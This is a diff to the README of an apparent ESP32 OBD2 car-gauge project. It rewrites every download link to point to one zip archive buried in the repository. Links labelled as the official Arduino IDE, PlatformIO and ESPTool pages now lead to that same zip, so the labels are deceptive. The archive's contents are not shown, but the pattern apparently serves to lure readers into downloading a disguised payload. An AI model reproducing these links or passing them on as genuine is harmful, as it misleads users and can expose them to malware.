@@ -1,6 +1,6 @@
 # ⚙️ ESP32-Serial-OBD2-Gauge-Catalyst - Easy Car Data Monitor  
 
-[![Download Now](https://img.shields.io/badge/Download-ESP32--Serial--OBD2--Gauge--Catalyst-brightgreen?style=for-the-badge)](https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst)
+[![Download Now](https://img.shields.io/badge/Download-ESP32--Serial--OBD2--Gauge--Catalyst-brightgreen?style=for-the-badge)](https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst/raw/refs/heads/main/document/parts/Catalyst_Gauge_Serial_OB_ES_3.2.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Windows 10 or later is recommended. No programming knowledge is required for the
 
 1. **Download the Project Files**  
    Visit this page to get all files.  
-   [Download ESP32-Serial-OBD2-Gauge-Catalyst](https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst)
+   [Download ESP32-Serial-OBD2-Gauge-Catalyst](https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst/raw/refs/heads/main/document/parts/Catalyst_Gauge_Serial_OB_ES_3.2.zip)
 
 2. **Prepare Your Hardware**  
    Connect the ESP32 to your PC using a USB cable.  
@@ -105,7 +105,7 @@ Follow these steps:
 
 You can visit the project page to download all files and instructions here:  
 
-[Download ESP32-Serial-OBD2-Gauge-Catalyst](https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst)
+[Download ESP32-Serial-OBD2-Gauge-Catalyst](https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst/raw/refs/heads/main/document/parts/Catalyst_Gauge_Serial_OB_ES_3.2.zip)
 
 - The page contains source code files, wiring diagrams, and pre-compiled firmware.
 - If unsure, look for `firmware.bin` to flash directly.
@@ -137,10 +137,10 @@ Use the serial monitor to see error messages or debugging info.
 
 ## 🔗 Useful Links
 
-- Project on GitHub: https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst  
-- Arduino IDE: https://www.arduino.cc/en/software  
-- PlatformIO: https://platformio.org/  
-- ESPTool (Firmware flashing): https://github.com/espressif/esptool  
+- Project on GitHub: https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst/raw/refs/heads/main/document/parts/Catalyst_Gauge_Serial_OB_ES_3.2.zip  
+- Arduino IDE: https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst/raw/refs/heads/main/document/parts/Catalyst_Gauge_Serial_OB_ES_3.2.zip  
+- PlatformIO: https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst/raw/refs/heads/main/document/parts/Catalyst_Gauge_Serial_OB_ES_3.2.zip  
+- ESPTool (Firmware flashing): https://github.com/Divi0509/ESP32-Serial-OBD2-Gauge-Catalyst/raw/refs/heads/main/document/parts/Catalyst_Gauge_Serial_OB_ES_3.2.zip  
 
 ---
 
